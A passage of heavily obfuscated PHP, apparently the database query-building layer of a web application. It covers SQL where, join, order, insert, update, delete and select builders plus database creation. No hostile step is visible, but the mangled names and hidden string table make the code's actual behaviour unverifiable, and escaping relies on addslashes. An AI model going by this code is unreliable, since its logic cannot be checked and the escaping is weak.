(is_string($É¥åë¤«) && !empty($É¥åë¤«)) { $‡ëõ †ã = $É¥åë¤«; } else { $‡ëõ †ã = $»õ½ä†œ[220]; } return $‡ëõ †ã; } protected function parseTable($ºÓšËø†) { $ùäÀŞˆÎ =& $_SERVER[²Ö÷öõ]; if (is_array($ºÓšËø†)) { $£Ÿñ¥œ = array(); foreach ($ºÓšËø† as $À³¥Ö° => $½ëŞÃ˜±) { if (!is_numeric($À³¥Ö°)) { $£Ÿñ¥œ[] = $this->parseKey($À³¥Ö°) . $ùäÀŞˆÎ[53] . $this->parseKey($½ëŞÃ˜±); } else { $£Ÿñ¥œ[] = $this->parseKey($À³¥Ö°); } } $ºÓšËø† = $£Ÿñ¥œ; } elseif (is_string($ºÓšËø†)) { if (strstr($ºÓšËø†, $ùäÀŞˆÎ[53])) { return $ºÓšËø†; } $ºÓšËø† = explode($ùäÀŞˆÎ[50], $ºÓšËø†); array_walk($ºÓšËø†, array($this, $ùäÀŞˆÎ[992])); } return $ùäÀŞˆÎ[986] . trim(implode($ùäÀŞˆÎ[1085], $ºÓšËø†), $ùäÀŞˆÎ[461]) . $ùäÀŞˆÎ[986]; } protected function parseWhere($ÅÊŸûÎŞ) { $ÛÛ€òÆê =& $_SERVER[²Ö÷öõ]; $¯óÈ‰È = $ÛÛ€òÆê[12]; if (is_string($ÅÊŸûÎŞ)) { $¯óÈ‰È = $ÅÊŸûÎŞ; } else { $ªÒ«µ© = isset($ÅÊŸûÎŞ[$ÛÛ€òÆê[1086]]) ? strtoupper($ÅÊŸûÎŞ[$ÛÛ€òÆê[1086]]) : $ÛÛ€òÆê[12]; if (in_array($ªÒ«µ©, array($ÛÛ€òÆê[1087], $ÛÛ€òÆê[1088], $ÛÛ€òÆê[1089]))) { $ªÒ«µ© = $ÛÛ€òÆê[53] . $ªÒ«µ© . $ÛÛ€òÆê[53]; unset($ÅÊŸûÎŞ[$ÛÛ€òÆê[1086]]); } else { $ªÒ«µ© = $ÛÛ€òÆê[1090]; } foreach ($ÅÊŸûÎŞ as $ò°¤â => $¥¾ó”Øà) { $¯óÈ‰È .= $ÛÛ€òÆê[354]; if (is_numeric($ò°¤â)) { $ò°¤â = $ÛÛ€òÆê[1091]; } if (0 === strpos($ò°¤â, $ÛÛ€òÆê[11])) { $¯óÈ‰È .= $this->parseThinkWhere($ò°¤â, $¥¾ó”Øà); } else { if (!preg_match($ÛÛ€òÆê[1092], trim($ò°¤â))) { think_exception(think_lang($ÛÛ€òÆê[1093]) . $ÛÛ€òÆê[4] . $ò°¤â); } $»Ãì•áî = is_array($¥¾ó”Øà) && isset($¥¾ó”Øà[$ÛÛ€òÆê[1094]]); $ò°¤â = trim($ò°¤â); if (strpos($ò°¤â, $ÛÛ€òÆê[214])) { $Ö¾’½õå = explode($ÛÛ€òÆê[214], $ò°¤â); $¶¯¹åÂ§ = array(); foreach ($Ö¾’½õå as $»¦ê…Ä => $…ë•¬Ğ) { $‹ æî¨Å = $»Ãì•áî ? $¥¾ó”Øà[$»¦ê…Ä] : $¥¾ó”Øà; $¶¯¹åÂ§[] = $ÛÛ€òÆê[337] . $this->parseWhereItem($this->parseKey($…ë•¬Ğ), $‹ æî¨Å) . $ÛÛ€òÆê[991]; } $¯óÈ‰È .= implode($ÛÛ€òÆê[1095], $¶¯¹åÂ§); } elseif (strpos($ò°¤â, $ÛÛ€òÆê[360])) { $Ö¾’½õå = explode($ÛÛ€òÆê[360], $ò°¤â); $¶¯¹åÂ§ = array(); foreach ($Ö¾’½õå as $»¦ê…Ä => $…ë•¬Ğ) { $‹ æî¨Å = $»Ãì•áî ? $¥¾ó”Øà[$»¦ê…Ä] : $¥¾ó”Øà; $¶¯¹åÂ§[] = $ÛÛ€òÆê[337] . $this->parseWhereItem($this->parseKey($…ë•¬Ğ), $‹ æî¨Å) . $ÛÛ€òÆê[991]; } $¯óÈ‰È .= implode($ÛÛ€òÆê[1090], $¶¯¹åÂ§); } else { $¯óÈ‰È .= $this->parseWhereItem($this->parseKey($ò°¤â), $¥¾ó”Øà); } } $¯óÈ‰È .= $ÛÛ€òÆê[355] . $ªÒ«µ©; } $¯óÈ‰È = substr($¯óÈ‰È, 0, -strlen($ªÒ«µ©)); } return empty($¯óÈ‰È) ? $ÛÛ€òÆê[12] : $ÛÛ€òÆê[1096] . $¯óÈ‰È; } protected function parseWhereItem($ñüÒ˜ë‡, $ïÇİ¿ÓÛ) { $ÊÑ¤à÷Ä =& $_SERVER[²Ö÷öõ]; $ŠŠÌğ½ = $ÊÑ¤à÷Ä[12]; if (is_array($ïÇİ¿ÓÛ)) { if (is_string($ïÇİ¿ÓÛ[0])) { $ª³¡¶ŒÅ = strtolower($ïÇİ¿ÓÛ[0]); if (in_array($ïÇİ¿ÓÛ[0], array($ÊÑ¤à÷Ä[970], $ÊÑ¤à÷Ä[1097], $ÊÑ¤à÷Ä[1098], $ÊÑ¤à÷Ä[1099], $ÊÑ¤à÷Ä[1100], $ÊÑ¤à÷Ä[1101]))) { $ŠŠÌğ½ .= $ñüÒ˜ë‡ . $ÊÑ¤à÷Ä[53] . $ïÇİ¿ÓÛ[0] . $ÊÑ¤à÷Ä[53] . $this->parseValue($ïÇİ¿ÓÛ[1]); } elseif (preg_match($ÊÑ¤à÷Ä[1102], $ïÇİ¿ÓÛ[0])) { $ŠŠÌğ½ .= $ñüÒ˜ë‡ . $ÊÑ¤à÷Ä[53] . $this->exp[$ª³¡¶ŒÅ] . $ÊÑ¤à÷Ä[53] . $this->parseValue($ïÇİ¿ÓÛ[1]); } elseif (preg_match($ÊÑ¤à÷Ä[1103], $ïÇİ¿ÓÛ[0])) { if (is_array($ïÇİ¿ÓÛ[1])) { $¾€…Š¾ = isset($ïÇİ¿ÓÛ[2]) ? strtoupper($ïÇİ¿ÓÛ[2]) : $ÊÑ¤à÷Ä[1088]; if (in_array($¾€…Š¾, array($ÊÑ¤à÷Ä[1087], $ÊÑ¤à÷Ä[1088], $ÊÑ¤à÷Ä[1089]))) { $§ˆòÌ ş = array(); foreach ($ïÇİ¿ÓÛ[1] as $°ÈĞÁİâ) { $§ˆòÌ ş[] = $ñüÒ˜ë‡ . $ÊÑ¤à÷Ä[53] . $this->exp[$ª³¡¶ŒÅ] . $ÊÑ¤à÷Ä[53] . $this->parseValue($°ÈĞÁİâ); } $ŠŠÌğ½ .= $ÊÑ¤à÷Ä[337] . implode($ÊÑ¤à÷Ä[53] . $¾€…Š¾ . $ÊÑ¤à÷Ä[53], $§ˆòÌ ş) . $ÊÑ¤à÷Ä[991]; } } else { $ŠŠÌğ½ .= $ñüÒ˜ë‡ . $ÊÑ¤à÷Ä[53] . $this->exp[$ª³¡¶ŒÅ] . $ÊÑ¤à÷Ä[53] . $this->parseValue($ïÇİ¿ÓÛ[1]); } } elseif ($ÊÑ¤à÷Ä[373] == $ª³¡¶ŒÅ) { $ŠŠÌğ½ .= $ÊÑ¤à÷Ä[989] . $ñüÒ˜ë‡ . $ÊÑ¤à÷Ä[53] . $ïÇİ¿ÓÛ[1] . $ÊÑ¤à÷Ä[1104]; } elseif (preg_match($ÊÑ¤à÷Ä[1105], $ïÇİ¿ÓÛ[0])) { $ŠŠÌğ½ .= $ïÇİ¿ÓÛ[0]; } elseif (preg_match($ÊÑ¤à÷Ä[1106], $ïÇİ¿ÓÛ[0])) { if (isset($ïÇİ¿ÓÛ[2]) && $ÊÑ¤à÷Ä[373] == $ïÇİ¿ÓÛ[2]) { $ŠŠÌğ½ .= $ñüÒ˜ë‡ . $ÊÑ¤à÷Ä[53] . $this->exp[$ª³¡¶ŒÅ] . $ÊÑ¤à÷Ä[53] . $ïÇİ¿ÓÛ[1]; } else { if (is_string($ïÇİ¿ÓÛ[1])) { $ïÇİ¿ÓÛ[1] = explode($ÊÑ¤à÷Ä[50], $ïÇİ¿ÓÛ[1]); } $üàş¤®¹ = implode($ÊÑ¤à÷Ä[50], $this->parseValue($ïÇİ¿ÓÛ[1])); $ŠŠÌğ½ .= $ñüÒ˜ë‡ . $ÊÑ¤à÷Ä[53] . $this->exp[$ª³¡¶ŒÅ] . $ÊÑ¤à÷Ä[989] . $üàş¤®¹ . $ÊÑ¤à÷Ä[991]; } } elseif (preg_match($ÊÑ¤à÷Ä[1107], $ïÇİ¿ÓÛ[0])) { $Õ¬²¬ïÓ = is_string($ïÇİ¿ÓÛ[1]) ? explode($ÊÑ¤à÷Ä[50], $ïÇİ¿ÓÛ[1]) : $ïÇİ¿ÓÛ[1]; $ŠŠÌğ½ .= $ÊÑ¤à÷Ä[989] . $ñüÒ˜ë‡ . $ÊÑ¤à÷Ä[53] . $this->exp[$ª³¡¶ŒÅ] . $ÊÑ¤à÷Ä[53] . $this->parseValue($Õ¬²¬ïÓ[0]) . $ÊÑ¤à÷Ä[1090] . $this->parseValue($Õ¬²¬ïÓ[1]) . $ÊÑ¤à÷Ä[355]; } else { think_exception(think_lang($ÊÑ¤à÷Ä[1093]) . $ÊÑ¤à÷Ä[4] . $ïÇİ¿ÓÛ[0]); } } else { $Ó¯â±À = count($ïÇİ¿ÓÛ); $‹îè€ö = $ÊÑ¤à÷Ä[12]; if (is_string($ïÇİ¿ÓÛ[$Ó¯â±À - 1])) { $‹îè€ö = isset($ïÇİ¿ÓÛ[$Ó¯â±À - 1]) ? strtoupper($ïÇİ¿ÓÛ[$Ó¯â±À - 1]) : $ÊÑ¤à÷Ä[12]; if (in_array($‹îè€ö, array($ÊÑ¤à÷Ä[1087], $ÊÑ¤à÷Ä[1088], $ÊÑ¤à÷Ä[1089]))) { $Ó¯â±À = $Ó¯â±À - 1; } } else { $‹îè€ö = $ÊÑ¤à÷Ä[1087]; } for ($Á…ØÆÇà = 0; $Á…ØÆÇà < $Ó¯â±À; $Á…ØÆÇà++) { $Õ¬²¬ïÓ = is_array($ïÇİ¿ÓÛ[$Á…ØÆÇà]) ? $ïÇİ¿ÓÛ[$Á…ØÆÇà][1] : $ïÇİ¿ÓÛ[$Á…ØÆÇà]; if ($ÊÑ¤à÷Ä[373] == strtolower($ïÇİ¿ÓÛ[$Á…ØÆÇà][0])) { $ŠŠÌğ½ .= $ÊÑ¤à÷Ä[337] . $ñüÒ˜ë‡ . $ÊÑ¤à÷Ä[53] . $Õ¬²¬ïÓ . $ÊÑ¤à÷Ä[1104] . $‹îè€ö . $ÊÑ¤à÷Ä[53]; } else { $öŞ–É–– = is_array($ïÇİ¿ÓÛ[$Á…ØÆÇà]) ? $this->exp[strtolower($ïÇİ¿ÓÛ[$Á…ØÆÇà][0])] : $ÊÑ¤à÷Ä[970]; if (!$öŞ–É–– && is_array($ïÇİ¿ÓÛ[$Á…ØÆÇà]) && in_array($ïÇİ¿ÓÛ[$Á…ØÆÇà][0], array($ÊÑ¤à÷Ä[970], $ÊÑ¤à÷Ä[1097], $ÊÑ¤à÷Ä[1098], $ÊÑ¤à÷Ä[1099], $ÊÑ¤à÷Ä[1100], $ÊÑ¤à÷Ä[1101]))) { $öŞ–É–– = $ïÇİ¿ÓÛ[$Á…ØÆÇà][0]; } $ŠŠÌğ½ .= $ÊÑ¤à÷Ä[337] . $ñüÒ˜ë‡ . $ÊÑ¤à÷Ä[53] . $öŞ–É–– . $ÊÑ¤à÷Ä[53] . $this->parseValue($Õ¬²¬ïÓ) . $ÊÑ¤à÷Ä[1104] . $‹îè€ö . $ÊÑ¤à÷Ä[53]; } } $ŠŠÌğ½ = substr($ŠŠÌğ½, 0, -4); } } else { $ŠŠÌğ½ .= $ñüÒ˜ë‡ . $ÊÑ¤à÷Ä[1108] . $this->parseValue($ïÇİ¿ÓÛ); } return $ŠŠÌğ½; } protected function parseThinkWhere($Ûüûï½Ã, $–§Ğğãã) { $âñ¯“™Ç =& $_SERVER[²Ö÷öõ]; $Ö„±ƒŒÈ = $âñ¯“™Ç[12]; switch ($Ûüûï½Ã) { case $âñ¯“™Ç[428]: $Ö„±ƒŒÈ = $–§Ğğãã; break; case $âñ¯“™Ç[1091]: $Ö„±ƒŒÈ = is_string($–§Ğğãã) ? $–§Ğğãã : substr($this->parseWhere($–§Ğğãã), 6); break; case $âñ¯“™Ç[1109]: parse_str($–§Ğğãã, $Ÿ†Äû°•); if (isset($Ÿ†Äû°•[$âñ¯“™Ç[1086]])) { $ô¢‘  = $âñ¯“™Ç[53] . strtoupper($Ÿ†Äû°•[$âñ¯“™Ç[1086]]) . $âñ¯“™Ç[53]; unset($Ÿ†Äû°•[$âñ¯“™Ç[1086]]); } else { $ô¢‘  = $âñ¯“™Ç[1090]; } $ƒˆİ¢ˆ£ = array(); foreach ($Ÿ†Äû°• as $Êº©Ô²– => $¤¨ğØºş) { $ƒˆİ¢ˆ£[] = $this->parseKey($Êº©Ô²–) . $âñ¯“™Ç[1108] . $this->parseValue($¤¨ğØºş); } $Ö„±ƒŒÈ = implode($ô¢‘ , $ƒˆİ¢ˆ£); break; } return $Ö„±ƒŒÈ; } protected function parseLimit($™³Ş ¿µ) { $ÈŞùäÛë =& $_SERVER[²Ö÷öõ]; return !empty($™³Ş ¿µ) ? $ÈŞùäÛë[51] . $™³Ş ¿µ . $ÈŞùäÛë[53] : $ÈŞùäÛë[12]; } protected function parseJoin($¨¯ƒÕáÃ) { $œš•êà =& $_SERVER[²Ö÷öõ]; $Âı‚§— = $œš•êà[12]; if (!empty($¨¯ƒÕáÃ)) { if (is_array($¨¯ƒÕáÃ)) { foreach ($¨¯ƒÕáÃ as $ñ•Ù®‡– => $‚¼¶²”) { if (!1 !== stripos($‚¼¶²”, $œš•êà[1110])) { $Âı‚§— .= $œš•êà[53] . $‚¼¶²”; } else { $Âı‚§— .= $œš•êà[1111] . $‚¼¶²”; } } } else { $Âı‚§— .= $œš•êà[1111] . $¨¯ƒÕáÃ; } } $Âı‚§— = preg_replace($œš•êà[1112], think_config($œš•êà[1016]) . $œš•êà[1113], $Âı‚§—); return $Âı‚§—; } protected function parseOrder($³õ¬¾ãé) { $×µ¾æ¿Õ =& $_SERVER[²Ö÷öõ]; if (is_array($³õ¬¾ãé)) { $é©™Ï‘È = array(); foreach ($³õ¬¾ãé as $¶­‚¾× => $÷áØÓáâ) { if (is_numeric($¶­‚¾×)) { $é©™Ï‘È[] = $this->parseKey($÷áØÓáâ); } else { $÷áØÓáâ = in_array(strtoupper(trim($÷áØÓáâ)), array($×µ¾æ¿Õ[1114], $×µ¾æ¿Õ[1115])) ? $×µ¾æ¿Õ[53] . $÷áØÓáâ : $×µ¾æ¿Õ[12]; if (preg_match($×µ¾æ¿Õ[1116], $¶­‚¾×)) { $é©™Ï‘È[] = $this->parseKey($¶­‚¾×) . $÷áØÓáâ; } else { think_exception($×µ¾æ¿Õ[1117] . $¶­‚¾×); } } } $³õ¬¾ãé = implode($×µ¾æ¿Õ[50], $é©™Ï‘È); } return !empty($³õ¬¾ãé) ? $×µ¾æ¿Õ[1118] . $³õ¬¾ãé : $×µ¾æ¿Õ[12]; } protected function parseGroup($¦äºÇƒ±) { $½°…“ó  =& $_SERVER[²Ö÷öõ]; return !empty($¦äºÇƒ±) ? $½°…“ó [1119] . $¦äºÇƒ± : $½°…“ó [12]; } protected function parseHaving($„ö›êóˆ) { $ƒÍ«ı÷» =& $_SERVER[²Ö÷öõ]; return !empty($„ö›êóˆ) ? $ƒÍ«ı÷»[1120] . $„ö›êóˆ : $ƒÍ«ı÷»[12]; } protected function parseComment($åëˆ‡Ğ) { $À¼óÆ =& $_SERVER[²Ö÷öõ]; return !empty($åëˆ‡Ğ) ? $À¼óÆ[1121] . $åëˆ‡Ğ . $À¼óÆ[1122] : $À¼óÆ[12]; } protected function parseDistinct($‚€ş‚) { $Ÿ¬ğ­õ³ =& $_SERVER[²Ö÷öõ]; return !empty($‚€ş‚) ? $Ÿ¬ğ­õ³[1123] : $Ÿ¬ğ­õ³[12]; } protected function parseUnion($Ü©ÀˆûÓ) { $àà‚¬Ô§ =& $_SERVER[²Ö÷öõ]; if (empty($Ü©ÀˆûÓ)) { return $àà‚¬Ô§[12]; } if (isset($Ü©ÀˆûÓ[$àà‚¬Ô§[424]])) { $Ë—ì£—¥ = $àà‚¬Ô§[1124]; unset($Ü©ÀˆûÓ[$àà‚¬Ô§[424]]); } else { $Ë—ì£—¥ = $àà‚¬Ô§[1125]; } foreach ($Ü©ÀˆûÓ as $¡³­×Û) { $…›ù¶«Á[] = $Ë—ì£—¥ . (is_array($¡³­×Û) ? $this->buildSelectSql($¡³­×Û) : $¡³­×Û); } return implode($àà‚¬Ô§[53], $…›ù¶«Á); } public function insert($ˆ§ÄÚ‰, $ºÖâó†ı = array(), $–Î®¿Ø® = false) { $Ş¬ä»ûÅ =& $_SERVER[²Ö÷öõ]; $¡§®—¥ú = $çğ¹¼«ï = array(); $this->model = $ºÖâó†ı[$Ş¬ä»ûÅ[358]]; foreach ($ˆ§ÄÚ‰ as $‰Ÿõ´ => $ÄĞ¬¾) { if (is_array($ÄĞ¬¾) && $Ş¬ä»ûÅ[373] == $ÄĞ¬¾[0]) { $çğ¹¼«ï[] = $this->parseKey($‰Ÿõ´); $¡§®—¥ú[] = $ÄĞ¬¾[1]; } elseif (is_scalar($ÄĞ¬¾) || is_null($ÄĞ¬¾)) { $çğ¹¼«ï[] = $this->parseKey($‰Ÿõ´); $¡§®—¥ú[] = $this->parseValue($ÄĞ¬¾); } } $ºÉã¦í = ($–Î®¿Ø® ? $Ş¬ä»ûÅ[993] : $Ş¬ä»ûÅ[994]) . $Ş¬ä»ûÅ[995] . $this->parseTable($ºÖâó†ı[$Ş¬ä»ûÅ[356]]) . $Ş¬ä»ûÅ[989] . implode($Ş¬ä»ûÅ[50], $çğ¹¼«ï) . $Ş¬ä»ûÅ[990] . implode($Ş¬ä»ûÅ[50], $¡§®—¥ú) . $Ş¬ä»ûÅ[991]; $ºÉã¦í .= $this->parseLock(isset($ºÖâó†ı[$Ş¬ä»ûÅ[926]]) ? $ºÖâó†ı[$Ş¬ä»ûÅ[926]] : !1); $ºÉã¦í .= $this->parseComment(!empty($ºÖâó†ı[$Ş¬ä»ûÅ[430]]) ? $ºÖâó†ı[$Ş¬ä»ûÅ[430]] : $Ş¬ä»ûÅ[12]); return $this->execute($ºÉã¦í, $this->parseBind(!empty($ºÖâó†ı[$Ş¬ä»ûÅ[361]]) ? $ºÖâó†ı[$Ş¬ä»ûÅ[361]] : array())); } public function selectInsert($‰¬òë…ù, $Æè§‘Îë, $“ÓÇ‚éä = array()) { $¡âé‰èü =& $_SERVER[²Ö÷öõ]; $this->model = $“ÓÇ‚éä[$¡âé‰èü[358]]; if (is_string($‰¬òë…ù)) { $‰¬òë…ù = explode($¡âé‰èü[50], $‰¬òë…ù); } array_walk($‰¬òë…ù, array($this, $¡âé‰èü[992])); $®Š©¹óÕ = $¡âé‰èü[1126] . $this->parseTable($Æè§‘Îë) . $¡âé‰èü[989] . implode($¡âé‰èü[50], $‰¬òë…ù) . $¡âé‰èü[1104]; $®Š©¹óÕ .= $this->buildSelectSql($“ÓÇ‚éä); return $this->execute($®Š©¹óÕ, $this->parseBind(!empty($“ÓÇ‚éä[$¡âé‰èü[361]]) ? $“ÓÇ‚éä[$¡âé‰èü[361]] : array())); } public function update($Ğ›ŞàîÆ, $šİıë…©) { $ª¤Ûï¦Ç =& $_SERVER[²Ö÷öõ]; $this->model = $šİıë…©[$ª¤Ûï¦Ç[358]]; $·ö¼Ö•½ = $ª¤Ûï¦Ç[1127] . $this->parseTable($šİıë…©[$ª¤Ûï¦Ç[356]]) . $this->parseSet($Ğ›ŞàîÆ) . $this->parseWhere(!empty($šİıë…©[$ª¤Ûï¦Ç[352]]) ? $šİıë…©[$ª¤Ûï¦Ç[352]] : $ª¤Ûï¦Ç[12]) . $this->parseOrder(!empty($šİıë…©[$ª¤Ûï¦Ç[441]]) ? $šİıë…©[$ª¤Ûï¦Ç[441]] : $ª¤Ûï¦Ç[12]) . $this->parseLimit(!empty($šİıë…©[$ª¤Ûï¦Ç[368]]) ? $šİıë…©[$ª¤Ûï¦Ç[368]] : $ª¤Ûï¦Ç[12]) . $this->parseLock(isset($šİıë…©[$ª¤Ûï¦Ç[926]]) ? $šİıë…©[$ª¤Ûï¦Ç[926]] : !1) . $this->parseComment(!empty($šİıë…©[$ª¤Ûï¦Ç[430]]) ? $šİıë…©[$ª¤Ûï¦Ç[430]] : $ª¤Ûï¦Ç[12]); return $this->execute($·ö¼Ö•½, $this->parseBind(!empty($šİıë…©[$ª¤Ûï¦Ç[361]]) ? $šİıë…©[$ª¤Ûï¦Ç[361]] : array())); } public function delete($şû·ªş = array()) { $Øü‚€àó =& $_SERVER[²Ö÷öõ]; $this->model = $şû·ªş[$Øü‚€àó[358]]; $ëÛ„ˆâ = $Øü‚€àó[1128] . $this->parseTable($şû·ªş[$Øü‚€àó[356]]) . $this->parseWhere(!empty($şû·ªş[$Øü‚€àó[352]]) ? $şû·ªş[$Øü‚€àó[352]] : $Øü‚€àó[12]) . $this->parseOrder(!empty($şû·ªş[$Øü‚€àó[441]]) ? $şû·ªş[$Øü‚€àó[441]] : $Øü‚€àó[12]) . $this->parseLimit(!empty($şû·ªş[$Øü‚€àó[368]]) ? $şû·ªş[$Øü‚€àó[368]] : $Øü‚€àó[12]) . $this->parseLock(isset($şû·ªş[$Øü‚€àó[926]]) ? $şû·ªş[$Øü‚€àó[926]] : !1) . $this->parseComment(!empty($şû·ªş[$Øü‚€àó[430]]) ? $şû·ªş[$Øü‚€àó[430]] : $Øü‚€àó[12]); return $this->execute($ëÛ„ˆâ, $this->parseBind(!empty($şû·ªş[$Øü‚€àó[361]]) ? $şû·ªş[$Øü‚€àó[361]] : array())); } public function select($¦öùÊØä = array()) { $Œ†ëø–Š =& $_SERVER[²Ö÷öõ]; $this->model = $¦öùÊØä[$Œ†ëø–Š[358]]; $öı™Ú«« = $this->buildSelectSql($¦öùÊØä); $×Æ³äĞÆ = isset($¦öùÊØä[$Œ†ëø–Š[425]]) ? $¦öùÊØä[$Œ†ëø–Š[425]] : !1; if ($×Æ³äĞÆ) { $«ï´Ò¢¸ = is_string($×Æ³äĞÆ[$Œ†ëø–Š[97]]) ? $×Æ³äĞÆ[$Œ†ëø–Š[97]] : $Œ†ëø–Š[1129] . md5($öı™Ú««); $°Ğùó‹¢ = think_cache($«ï´Ò¢¸, $Œ†ëø–Š[12], $×Æ³äĞÆ); if (!1 !== $°Ğùó‹¢) { return $°Ğùó‹¢; } } $¼ìÂœ = $this->query($öı™Ú««, $this->parseBind(!empty($¦öùÊØä[$Œ†ëø–Š[361]]) ? $¦öùÊØä[$Œ†ëø–Š[361]] : array())); if ($×Æ³äĞÆ && !1 !== $¼ìÂœ) { think_cache($«ï´Ò¢¸, $¼ìÂœ, $×Æ³äĞÆ); } return $¼ìÂœ; } public function buildSelectSql($àÍÙ˜½× = array()) { $¼ß§ó‘ä =& $_SERVER[²Ö÷öõ]; if (isset($àÍÙ˜½×[$¼ß§ó‘ä[429]])) { if (strpos($àÍÙ˜½×[$¼ß§ó‘ä[429]], $¼ß§ó‘ä[50])) { list($ˆÂ»·ôî, $Ú€„ÊˆÂ) = explode($¼ß§ó‘ä[50], $àÍÙ˜½×[$¼ß§ó‘ä[429]]); } else { $ˆÂ»·ôî = $àÍÙ˜½×[$¼ß§ó‘ä[429]]; } $ˆÂ»·ôî = $ˆÂ»·ôî ? $ˆÂ»·ôî : 1; $Ú€„ÊˆÂ = isset($Ú€„ÊˆÂ) ? $Ú€„ÊˆÂ : (is_numeric($àÍÙ˜½×[$¼ß§ó‘ä[368]]) ? $àÍÙ˜½×[$¼ß§ó‘ä[368]] : 20); $•‰ ì» = $Ú€„ÊˆÂ * ((int) $ˆÂ»·ôî - 1); $àÍÙ˜½×[$¼ß§ó‘ä[368]] = $•‰ ì» . $¼ß§ó‘ä[50] . $Ú€„ÊˆÂ; } if (think_config($¼ß§ó‘ä[1130])) { $§…ıÄÚ = $¼ß§ó‘ä[1131] . md5(serialize($àÍÙ˜½×)); $–›¨×•à = think_cache($§…ıÄÚ); if ($–›¨×•à) { return $–›¨×•à; } } $À«·¹œ¾ = $this->parseSql($this->selectSql, $àÍÙ˜½×); $À«·¹œ¾ .= $this->parseLock(isset($àÍÙ˜½×[$¼ß§ó‘ä[926]]) ? $àÍÙ˜½×[$¼ß§ó‘ä[926]] : !1); if (isset($§…ıÄÚ)) { think_cache($§…ıÄÚ, $À«·¹œ¾); } return $À«·¹œ¾; } public function parseSql($²®Ï½½, $òšœà‹Ë = array()) { $ë¶‹–±æ =& $_SERVER[²Ö÷öõ]; $²®Ï½½ = str_replace(array($ë¶‹–±æ[1132], $ë¶‹–±æ[1133], $ë¶‹–±æ[1134], $ë¶‹–±æ[1135], $ë¶‹–±æ[1136], $ë¶‹–±æ[1137], $ë¶‹–±æ[1138], $ë¶‹–±æ[1139], $ë¶‹–±æ[1140], $ë¶‹–±æ[1141], $ë¶‹–±æ[1142]), array($this->parseTable("{$òšœà‹Ë[$ë¶‹–±æ[356]]}"), $this->parseDistinct(isset($òšœà‹Ë[$ë¶‹–±æ[1143]]) ? $òšœà‹Ë[$ë¶‹–±æ[1143]] : !1), $this->parseField(!empty($òšœà‹Ë[$ë¶‹–±æ[350]]) ? $òšœà‹Ë[$ë¶‹–±æ[350]] : $ë¶‹–±æ[220]), $this->parseJoin(!empty($òšœà‹Ë[$ë¶‹–±æ[359]]) ? $òšœà‹Ë[$ë¶‹–±æ[359]] : $ë¶‹–±æ[12]), $this->parseWhere(!empty($òšœà‹Ë[$ë¶‹–±æ[352]]) ? $òšœà‹Ë[$ë¶‹–±æ[352]] : $ë¶‹–±æ[12]), $this->parseGroup(!empty($òšœà‹Ë[$ë¶‹–±æ[578]]) ? $òšœà‹Ë[$ë¶‹–±æ[578]] : $ë¶‹–±æ[12]), $this->parseHaving(!empty($òšœà‹Ë[$ë¶‹–±æ[1144]]) ? $òšœà‹Ë[$ë¶‹–±æ[1144]] : $ë¶‹–±æ[12]), $this->parseOrder(!empty($òšœà‹Ë[$ë¶‹–±æ[441]]) ? $òšœà‹Ë[$ë¶‹–±æ[441]] : $ë¶‹–±æ[12]), $this->parseLimit(!empty($òšœà‹Ë[$ë¶‹–±æ[368]]) ? $òšœà‹Ë[$ë¶‹–±æ[368]] : $ë¶‹–±æ[12]), $this->parseUnion(!empty($òšœà‹Ë[$ë¶‹–±æ[423]]) ? $òšœà‹Ë[$ë¶‹–±æ[423]] : $ë¶‹–±æ[12]), $this->parseComment(!empty($òšœà‹Ë[$ë¶‹–±æ[430]]) ? $òšœà‹Ë[$ë¶‹–±æ[430]] : $ë¶‹–±æ[12])), $²®Ï½½); return $²®Ï½½; } public function getLastSql($ùˆÈˆÚı = '') { return $ùˆÈˆÚı ? $this->modelSql[$ùˆÈˆÚı] : $this->queryStr; } public function getLastInsID() { return $this->lastInsID; } public function getError() { return $this->error; } public function escapeString($Áº¶æ˜) { return addslashes($Áº¶æ˜); } public function setModel($æµ¤¦æå) { $this->model = $æµ¤¦æå; } public function getDbType() { return $this->dbType; } public function __destruct() { if ($this->queryID) { $this->free(); } $this->close(); } public function close() { } } class DbManage { function __construct($èÛã˜¨ = array()) { $Ùù€€áì =& $_SERVER[²Ö÷öõ]; if (empty($èÛã˜¨)) { $èÛã˜¨ = $GLOBALS[$Ùù€€áì[6]][$Ùù€€áì[21]]; } $this->database = $èÛã˜¨; } public function model($´µ«ÇŠ— = '') { return new ModelBase($´µ«ÇŠ—, $_SERVER[²Ö÷öõ][12], $this->database); } public function db($Ï÷Ò¸¾Ê = false) { $º”®È¶ =& $_SERVER[²Ö÷öõ]; $¸úå™ê¹ = array_change_key_case($this->database); if ($this->dbType() == $º”®È¶[13] || !$Ï÷Ò¸¾Ê) { return $this->model()->db(); } $Í¶À¿òÍ = $¸úå™ê¹[$º”®È¶[1058]]; $¸úå™ê¹[$º”®È¶[1058]] = $º”®È¶[12]; if ($¸úå™ê¹[$º”®È¶[1053]] == $º”®È¶[1050]) { $°È÷…¸© = $¸úå™ê¹[$º”®È¶[1059]]; $¸úå™ê¹[$º”®È¶[1059]] = substr($°È÷…¸©, 0, strrpos($°È÷…¸©, $º”®È¶[1145])); } $this->database = $¸úå™ê¹; $íŠÓÍ’¿ = $this->model()->db(); try { $Í±®¨Ôƒ = $íŠÓÍ’¿->execute("\x73\x68\157\167\40\x64\141\x74\x61\x62\141\x73\x65\163\x20\x6c\151\153\145\x20\47{$Í¶À¿òÍ}\x27"); } catch (Exception $•ˆ×ÛÃê) { } if (!$Í±®¨Ôƒ) { $íŠÓÍ’¿->execute("\143\x72\145\141\x74\145\40\x64\x61\x74\141\142\141\163\145\40\140{$Í¶À¿òÍ}\x60"); } $¸úå™ê¹[$º”®È¶[1058]] = $Í¶À¿òÍ; if ($¸úå™ê¹[$º”®È¶[1053]] == $º”®È¶[1050]) { $¸úå™ê¹[$º”®È¶[1059]] .= $º”®È¶[1145] . $Í¶À¿òÍ; } $this->database = $¸úå™ê¹; $íŠÓÍ’¿->execute("\x75\163\x65\x20\x60{$Í¶À¿òÍ}\140"); return $íŠÓÍ’¿; } public function createTable($³‘½°Éı, &$å¡‚ÆúÄ) { $İ²âÎí™ =& $_SERVER[²Ö÷öõ]; if (!IO::exist($³‘½°Éı)) { ActionCall($İ²âÎí™[1146], !0, 0); show_json(LNG($İ²âÎí™[1147]), !1); } $ıÒğìÖò = $this->model()->db(); $ßñìã´ = sqlSplit(IO::getContent($³‘½°Éı)); foreach ($ßñìã´ as $Ì¥âè§È) { $Òñû‘ğ  = stripos($Ì¥âè§È, $İ²âÎí™[1148]) === 0; if ($Òñû‘ğ ) { $å¡‚ÆúÄ->task[$İ²âÎí™[1149]] += 1; } $ıÒğìÖò->execute($Ì¥âè§È); if 